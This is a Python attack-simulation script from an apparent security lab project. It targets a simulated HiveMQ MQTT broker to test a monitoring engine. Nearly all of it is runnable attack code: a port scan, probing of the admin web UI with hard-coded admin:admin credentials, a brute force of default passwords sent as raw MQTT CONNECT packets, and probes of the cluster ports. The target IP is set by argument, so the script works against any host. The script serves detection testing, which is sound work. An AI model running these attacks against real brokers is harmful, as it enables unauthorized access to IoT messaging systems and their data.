"""
Attack Script: HiveMQ MQTT Broker (port 8883 + web UI 8000)
============================================================
Target  : Simulated HiveMQ broker (hivemq_broker.py)
Default : 127.0.0.1:8883 (MQTT) and 127.0.0.1:8000 (Web UI)

Attacks performed
-----------------
1. PORT SCAN          — scans 20 ports including HiveMQ-specific ones
                        → triggers PORT_SCAN alert in monitoring engine
2. WEB UI ENUMERATION — probes the HiveMQ Control Center (port 8000)
                        → leaks admin console endpoints, version info
3. MQTT BRUTE FORCE   — sends rapid MQTT CONNECT attempts with credentials
                        → demonstrates weak auth on MQTT port 8883
4. CLUSTER PORT PROBE — probes HiveMQ cluster ports (7800, 7801)
                        → checks if cluster interface is exposed

Run order
---------
  1. python Devices/MQTT/hivemq_broker.py   (start the broker)
  2. python Engines/main.py                 (start monitoring)
  3. python Attacks/attack_hivemq.py        (run this script)

Expected monitoring alerts
--------------------------
  [PORT_SCAN]  — more than 10 distinct ports probed within 10 seconds
"""

import socket
import time
import http.client
import struct
import sys

# ── CONFIG ────────────────────────────────────────────────────────────────────
# Override with:  python attack_hivemq.py <TARGET_IP> [MQTT_PORT] [WEBUI_PORT]
# Docker example: python attack_hivemq.py 172.17.0.9 8883 8000
TARGET_IP    = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
MQTT_PORT    = int(sys.argv[2]) if len(sys.argv) > 2 else 8883
WEBUI_PORT   = int(sys.argv[3]) if len(sys.argv) > 3 else 8000
SCAN_TIMEOUT = 0.3
# ─────────────────────────────────────────────────────────────────────────────


def print_banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)


# ── ATTACK 1: PORT SCAN ───────────────────────────────────────────────────────
def attack_port_scan():
    print_banner("ATTACK 1: Port Scan — HiveMQ Specific Ports")
    print(f"  Target : {TARGET_IP}")
    print(f"  Action : Probing HiveMQ MQTT, web UI, and cluster ports")
    print(f"  Alert  : PORT_SCAN (>10 distinct ports in 10 seconds)\n")

    # Mix of standard + HiveMQ-specific ports
    ports = [
        22, 80, 443,
        1883,               # Standard MQTT (unencrypted)
        8000,               # HiveMQ Control Center
        8080,               # HiveMQ alternative web
        8083,               # HiveMQ WebSocket MQTT
        8443,               # HiveMQ WebSocket MQTT TLS
        8883,               # HiveMQ MQTT (TLS)
        8888,               # HiveMQ alternative
        7800,               # HiveMQ cluster
        7801,               # HiveMQ cluster backup
        9000,               # Alternative admin
        9090,               # Metrics
        9399,               # Prometheus metrics
        3000,               # Grafana (if monitoring)
        5601,               # Kibana (if ELK stack)
        2181,               # ZooKeeper (cluster coord)
        9092,               # Kafka (message bus)
        6379,               # Redis (session store)
    ]

    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SCAN_TIMEOUT)
        result = sock.connect_ex((TARGET_IP, port))
        status = "OPEN" if result == 0 else "closed"
        if result == 0:
            open_ports.append(port)
        print(f"    Port {port:5d} : {status}")
        sock.close()

    print(f"\n  Scan complete. Open ports: {open_ports or 'none'}")
    print("  >> PORT_SCAN alert should have fired in the monitoring engine")


# ── ATTACK 2: WEB UI ENUMERATION ─────────────────────────────────────────────
def attack_webui_enum():
    print_banner("ATTACK 2: HiveMQ Control Center Web UI Enumeration")
    print(f"  Target : http://{TARGET_IP}:{WEBUI_PORT}")
    print(f"  Action : Probing admin console endpoints for version and config info\n")

    endpoints = [
        "GET  /",
        "GET  /api/v1/health",
        "GET  /api/v1/nodes",
        "GET  /api/v1/mqtt/clients",
        "GET  /api/v1/mqtt/subscriptions",
        "GET  /api/v1/mqtt/connections",
        "GET  /api/v1/mqtt/messages",
        "GET  /api/v1/services",
        "GET  /api/v1/broker",
        "GET  /api/v1/license",
        "POST /api/v1/mqtt/clients/disconnect",
    ]

    for entry in endpoints:
        method, path = entry.split(None, 1)
        try:
            conn = http.client.HTTPConnection(TARGET_IP, WEBUI_PORT, timeout=3)
            headers = {
                "Authorization": "Basic YWRtaW46YWRtaW4=",  # admin:admin base64
                "User-Agent": "HiveMQ-Attack/1.0",
                "Accept": "application/json",
            }
            conn.request(method, path, headers=headers)
            resp = conn.getresponse()
            body = resp.read()[:120].decode(errors="ignore")
            print(f"    {method} {path:40s} → {resp.status}")
            if resp.status == 200 and body:
                print(f"      Body : {body}")
            conn.close()
        except ConnectionRefusedError:
            print(f"    {method} {path:40s} → Connection refused (device not running?)")
            break
        except Exception as e:
            print(f"    {method} {path:40s} → {type(e).__name__}")

    print("\n  >> Admin endpoints enumerated — check for unauthenticated responses")


# ── ATTACK 3: MQTT BRUTE FORCE ────────────────────────────────────────────────
def _encode_remaining_length(length):
    encoded = []
    while True:
        byte = length % 128
        length //= 128
        if length > 0:
            byte |= 0x80
        encoded.append(byte)
        if length == 0:
            break
    return bytes(encoded)


def _build_connect(client_id, username=None, password=None):
    """Build raw MQTT CONNECT packet (v3.1.1)."""
    connect_flags = 0x02
    if username:
        connect_flags |= 0x80
    if password:
        connect_flags |= 0x40

    cid   = client_id.encode()
    body  = b'\x00\x04MQTT\x04' + bytes([connect_flags]) + b'\x00\x3c'
    body += struct.pack(">H", len(cid)) + cid

    if username:
        u = username.encode()
        body += struct.pack(">H", len(u)) + u
    if password:
        p = password.encode()
        body += struct.pack(">H", len(p)) + p

    return bytes([0x10]) + _encode_remaining_length(len(body)) + body


def attack_mqtt_brute():
    print_banner("ATTACK 3: MQTT Credential Brute Force (port 8883)")
    print(f"  Target : {TARGET_IP}:{MQTT_PORT}")
    print(f"  Action : Trying common credentials against MQTT port")
    print(f"  Note   : Port 8883 is TLS in production — simulated broker accepts plaintext\n")

    credentials = [
        ("admin",   "hivemq"),
        ("admin",   "admin"),
        ("admin",   "password"),
        ("hivemq",  "hivemq"),
        ("mqtt",    "mqtt"),
        ("user",    "user"),
        ("guest",   "guest"),
        (None,      None),      # Anonymous
    ]

    for username, password in credentials:
        label = f"{username}:{password}" if username else "anonymous"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, MQTT_PORT))

            pkt  = _build_connect(f"brute-{label[:6]}", username, password)
            sock.sendall(pkt)

            resp = sock.recv(4)
            if len(resp) >= 4 and resp[0] == 0x20:
                code   = resp[3]
                result = "ACCEPTED" if code == 0 else f"rejected (code {code})"
            else:
                result = f"unexpected response: {resp.hex() if resp else 'empty'}"

            print(f"    {label:25s} → {result}")
            sock.close()
            time.sleep(0.05)

        except ConnectionRefusedError:
            print("  Connection refused — is hivemq_broker.py running?")
            break
        except Exception as e:
            print(f"    {label:25s} → {type(e).__name__}: {e}")

    print("\n  >> Brute force complete — UNENCRYPTED connections also trigger alerts")


# ── ATTACK 4: CLUSTER PORT PROBE ─────────────────────────────────────────────
def attack_cluster_probe():
    print_banner("ATTACK 4: HiveMQ Cluster Port Probe")
    print(f"  Target : {TARGET_IP}")
    print(f"  Action : Checking for exposed HiveMQ cluster communication ports")
    print(f"  Risk   : Exposed cluster ports allow node injection / MitM attacks\n")

    cluster_ports = {
        7800: "HiveMQ cluster channel (Hazelcast default)",
        7801: "HiveMQ cluster channel (backup)",
        7802: "HiveMQ cluster channel (tertiary)",
        9399: "HiveMQ Prometheus metrics endpoint",
        5701: "Hazelcast cluster port",
    }

    for port, description in cluster_ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SCAN_TIMEOUT)
        result = sock.connect_ex((TARGET_IP, port))
        status = "OPEN  ← EXPOSED!" if result == 0 else "closed"
        print(f"    Port {port} ({description})")
        print(f"      Status : {status}")
        sock.close()

    print("\n  >> Exposed cluster ports allow an attacker to join the HiveMQ cluster")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    print("\n" + "#" * 60)
    print("#  AutoSecure Attack Simulation — HiveMQ MQTT Broker       #")
    print("#  Target : port 8883 (MQTT) + port 8000 (Web UI)          #")
    print("#  FOR EDUCATIONAL / LAB USE ONLY                         #")
    print("#" * 60)
    print(f"\n  Target IP   : {TARGET_IP}")
    print(f"  MQTT Port   : {MQTT_PORT}")
    print(f"  Web UI Port : {WEBUI_PORT}")
    print("\n  Docker: find container IP with:")
    print("    docker inspect --format '{{.NetworkSettings.IPAddress}}' autosecure-mqtt-hivemq-1")
    print("  Or run:  python Attacks/get_docker_ips.py")
    print("\n  Make sure hivemq_broker.py and the monitoring engine are running.")
    if "--auto" not in sys.argv:
        input("\n  Press Enter to begin attacks...")

    attack_port_scan()
    time.sleep(1)
    attack_webui_enum()
    time.sleep(1)
    attack_mqtt_brute()
    time.sleep(1)
    attack_cluster_probe()

    print("\n" + "=" * 60)
    print("  All attacks complete.")
    print("  Check the monitoring engine output for triggered alerts.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
